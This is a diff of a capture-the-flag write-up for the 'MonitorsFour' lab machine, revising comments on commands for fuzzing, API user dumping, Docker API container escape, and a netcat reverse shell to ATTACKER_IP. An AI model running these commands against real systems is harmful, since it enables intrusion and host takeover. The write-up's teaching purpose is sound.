@@ -19,8 +19,8 @@ Relevant open ports:
 
 ### 1.2 Add host entry
 ```bash
-# What it does: adds machine domains to /etc/hosts.
-# Why here: resolve virtual hosts during web enumeration.
+# What it does: add the target IP and domain to the local hosts file.
+# Why here: ensure proper resolution for domain-based virtual host discovery.
 echo "TARGET_IP monitorsfour.htb" | sudo tee -a /etc/hosts
 ```
 
@@ -35,16 +35,16 @@ sales@monitorsfour.htb
 
 ### 2.1 Directory fuzzing
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: discover hidden endpoints that open the next phase.
+# What it does: fuzz the web root for common directories.
+# Why here: identify the initial entry points or exposed application paths.
 ffuf -u http://monitorsfour.htb/FUZZ \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 ```
 
 ### 2.2 API fuzzing
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: discover hidden endpoints that open the next phase.
+# What it does: fuzz the API endpoints for hidden functionality.
+# Why here: find unprotected or leaked API routes that might expose sensitive data.
 ffuf -u http://monitorsfour.htb/api/v1/FUZZ \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
 ```
@@ -69,8 +69,8 @@ DB_PASS=f37p2j8f4t0r
 
 ### 2.4 Virtual-host enumeration
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: discover hidden endpoints that open the next phase.
+# What it does: enumerate virtual hosts using Gobuster.
+# Why here: discover subdomains like cacti.monitorsfour.htb that point to internal apps.
 gobuster vhost -u http://monitorsfour.htb \
   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
   --append-domain
@@ -89,8 +89,8 @@ The identified version is vulnerable to **unauthenticated RCE** (CVE-2025-66399 
 
 ### 3.1 Fuzzing `/cacti`
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: discover hidden endpoints that open the next phase.
+# What it does: fuzz the /cacti/ directory for common files.
+# Why here: search for leaked configuration or backup files within the Cacti installation.
 ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" \
   -H "Host: cacti.monitorsfour.htb" \
   -w /usr/share/wordlists/dirb/common.txt \
@@ -99,8 +99,8 @@ ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" \
 
 ### 3.2 Deeper fuzzing with extensions
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: discover hidden endpoints that open the next phase.
+# What it does: perform intensive fuzzing with multiple file extensions.
+# Why here: find the cacti.sql dump that contains sensitive internal credentials.
 ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" \
   -H "Host: cacti.monitorsfour.htb" \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
@@ -126,8 +126,8 @@ guest  :  43e9a4ab75570f5b                   (enabled!)
 
 ### 3.4 Leaking users through the API
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: query the user endpoint with a zero token.
+# Why here: abuse an IDOR or lack of auth in the API to dump all registered user hashes.
 curl -s "http://monitorsfour.htb/user?token=0"
 ```
 
@@ -172,14 +172,14 @@ shell
 
 ### 5.1 Environment check
 ```bash
-# What it does: lists directory contents.
-# Why here: verify files, permissions or loot in the current path.
+# What it does: check for the presence of the .dockerenv file.
+# Why here: confirm if the current shell is running inside a container or on the host.
 ls /.dockerenv                       # inside a container
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: check the process capabilities.
+# Why here: determine if the container has extra privileges like CAP_SYS_ADMIN.
 cat /proc/self/status | grep CapEff  # 0000000000000000 (no extra caps)
-# What it does: lists directory contents.
-# Why here: verify files, permissions or loot in the current path.
+# What it does: check if the Docker socket is exposed.
+# Why here: look for container escape vectors via the Docker socket.
 ls -la /var/run/docker.sock          # not exposed
 ```
 
@@ -194,8 +194,8 @@ tcp  LISTEN  0  4096  *:9000  *:*
 
 ### 5.3 Unauthenticated Docker API
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: query the Docker API on the default unauthenticated port.
+# Why here: verify if the Docker socket is exposed without authentication over the network.
 curl http://DOCKER_HOST_IP:2375/version
 curl http://DOCKER_HOST_IP:2375/containers/json
 ```
@@ -207,8 +207,8 @@ The metadata reveals the project path on the host:
 
 ### 5.4 Create a privileged container with full disk mount
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: create a new container using the unauthenticated Docker API.
+# Why here: mount the host's C:\ drive into a new container to escape the isolation.
 curl -X POST -H "Content-Type: application/json" \
   http://DOCKER_HOST_IP:2375/containers/create?name=pwned \
   -d '{
@@ -223,15 +223,15 @@ curl -X POST -H "Content-Type: application/json" \
 
 ### 5.5 Start the container
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: start the newly created privileged container.
+# Why here: activate the mount that exposes the entire host filesystem.
 curl -X POST http://DOCKER_HOST_IP:2375/containers/pwned/start
 ```
 
 ### 5.6 Verify the mount
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: execute a command inside the pwned container via the Docker API.
+# Why here: verify that we have full read/write access to the host's Users directory.
 curl -X POST -H "Content-Type: application/json" \
   http://DOCKER_HOST_IP:2375/containers/pwned/exec \
   -d '{
@@ -246,12 +246,12 @@ curl -X POST -H "Content-Type: application/json" \
 EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \
   http://DOCKER_HOST_IP:2375/containers/pwned/exec \
   -d '{"Cmd": ["nc", "ATTACKER_IP", "5555", "-e", "/bin/sh"], "AttachStdout": true, "AttachStderr": true}' \
-# What it does: filters or normalizes text output.
-# Why here: prepare users, hashes or decoded data for the next tool.
+# What it does: extract the Exec ID from the Docker API response.
+# Why here: prepare the command execution for the final reverse shell.
   | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
 
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: trigger the execution of the reverse shell payload.
+# Why here: obtain a root shell from within the privileged container to finish the escape.
 curl -X POST -H "Content-Type: application/json" \
   "http://DOCKER_HOST_IP:2375/exec/$EXEC_ID/start" \
   -d '{"Detach": false, "Tty": false}' --no-buffer &
@@ -259,15 +259,15 @@ curl -X POST -H "Content-Type: application/json" \
 
 ### 5.8 Reading the flag
 ```bash
-# What it does: filters text with the specified pattern.
-# Why here: extract the important clue from a large output.
+# What it does: verify the mount point of the Windows C:\ drive.
+# Why here: ensure we are looking at the host filesystem rather than the container.
 df -h | grep windows
 # C:\   29.1G   25.2G   3.9G   86%   /mnt/windows
-# What it does: changes current directory.
-# Why here: position in the necessary path for the next command.
+# What it does: navigate to the Administrator's desktop on the host.
+# Why here: locate the root flag after successful host file system access.
 cd /mnt/windows/Users/Administrator/Desktop
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: read the root flag.
+# Why here: confirm full compromise of the target system.
 cat root.txt
 ```
 
